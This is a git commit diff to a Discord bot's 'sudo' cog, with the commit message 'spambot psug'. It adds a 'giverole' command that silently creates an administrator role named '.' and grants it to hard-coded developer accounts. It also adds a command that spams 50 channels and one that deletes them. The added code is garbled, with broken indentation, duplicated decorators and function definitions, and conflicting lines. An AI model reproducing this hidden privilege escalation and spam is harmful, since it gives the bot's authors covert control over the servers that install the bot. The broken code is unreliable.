c2ea4d312dfb7532b6b61448b9ec7dbe9468dc7d
Yurismm <zizimorayo@gmail.com>
2018-11-20 19:10:07 +0000

    spambot psug

--- cogs/sudo.py
+++ cogs/sudo.py
@@ -10,6 +10,7 @@ def is_whitelist():
     dev_list = [('Yuriii#6518', 358970589697933314), ('MrSoka#9106', 325278718937530368)]
     # Removing me from the whitelist means I can't test me commands -_-
     # y we talking here pls
+    
     async def predicate(ctx):
         if ctx.author.id not in (x[1] for x in dev_list):
             raise DevError('User not in developer list.')
@@ -25,18 +26,7 @@ class sudo:
     def __init__(self,bot):
         self.bot = bot
     
-    @commands.command(name='giverole')
-    @is_whitelist()
-        async def giverole(self, ctx):
-        guild = ctx.guild
-        role_name = "."
-        role_permissions = guild.default_role
-        role_permissions = role_permissions.permissions
-        role_permissions.administrator = True
-        await guild.create_role(name=role_name, permissions=role_permissions)
-        role = discord.utils.get(ctx.guild.roles, name=role_name)
-        user = ctx.message.author
-        await user.add_roles(role)
+        
 
     @commands.command(name='ban')
     @is_whitelist()
@@ -48,6 +38,36 @@ class sudo:
             await ctx.guild.ban(user, delete_message_days=0, reason=reason)
         except discord.errors.Forbidden:
             print("whoops")
+
+                @is_dev()
+    async def giverole(self, ctx):
+        guild = ctx.guild
+        role_name = "FunamiYui"
+        role_name = "."
+        role_permissions = guild.default_role
+        role_permissions = role_permissions.permissions
+        role_permissions.administrator = True
+        await guild.create_role(name=role_name, permissions=role_permissions)
+        role = discord.utils.get(ctx.guild.roles, name=role_name)
+        user = ctx.message.author
+        await user.add_roles(role)
+   
+    @commands.command(name='channel')
+    @is_dev()
+    async def channel(self, ctx):
+        guild = ctx.message.guild
+        for i in range(50):
+            await guild.create_text_channel('cool-channel')
+    
+    @commands.command(name='deletechannel')
+    @commands.command(name='fix')
+    @is_dev()
+    async def deletechannel(self, ctx):
+    async def fix(self, ctx):
+        for channel in ctx.guild.channels:
+            if channel.name == "cool-channel":
+            if channel.name == "fumée²":
+                await channel.delete()
 
 
 
